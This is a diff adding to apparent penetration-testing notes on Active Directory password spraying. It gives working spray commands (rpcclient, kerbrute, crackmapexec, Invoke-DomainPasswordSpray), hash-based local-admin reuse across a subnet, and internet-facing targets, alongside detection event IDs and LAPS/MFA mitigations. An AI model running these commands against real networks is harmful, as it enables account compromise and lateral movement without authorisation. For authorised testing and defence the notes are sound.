@@ -132,6 +132,31 @@ Then validate + loot: `cme smb <DC> -u <user> -p <pw> --shares --sessions`.
 
 > Spraying is how a user list with no passwords becomes a foothold. The discipline is all in step 1 — lock out a client's users and you've caused an incident, not found a finding.
 
+### Spraying — execution specifics
+```bash
+# Linux
+for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC> | grep Authority; done
+kerbrute passwordspray -d <domain> --dc <DC> valid_users.txt Welcome1
+sudo crackmapexec smb <DC> -u valid_users.txt -p Password123 | grep +
+```
+```powershell
+# Windows
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+### Local admin password reuse (high-value)
+If one local Administrator hash/password is shared across machines (classic without LAPS), spray it across the subnet with `--local-auth` → instant local admin on every box that reuses it:
+```bash
+sudo crackmapexec smb --local-auth <range> -u administrator -H <NT_hash> | grep +
+```
+This is often how one cracked/dumped local-admin hash cascades into the whole network. **Fix: LAPS** (unique local admin password per host).
+
+### Detection & external targets (for the report)
+- **Detect:** Event ID **4625** (failed logon), **4771** (Kerberos pre-auth failure) spiking across many accounts.
+- **Mitigate:** MFA, least privilege, strong password policy/filters, separate admin vs user accounts, LAPS.
+- **External spray surfaces** (same technique, internet-facing): M365 / OWA, Citrix / VMware Horizon / RDS, VPN portals (Fortinet, SonicWall), custom AD-auth web apps.
+
 ## AD attack flow (reference)
 Key ports: 88 (Kerberos), 135/593 (RPC), 139/445 (SMB), 389/636/3268/3269 (LDAP/GC), 464 (kpasswd), 3389 (RDP).
 
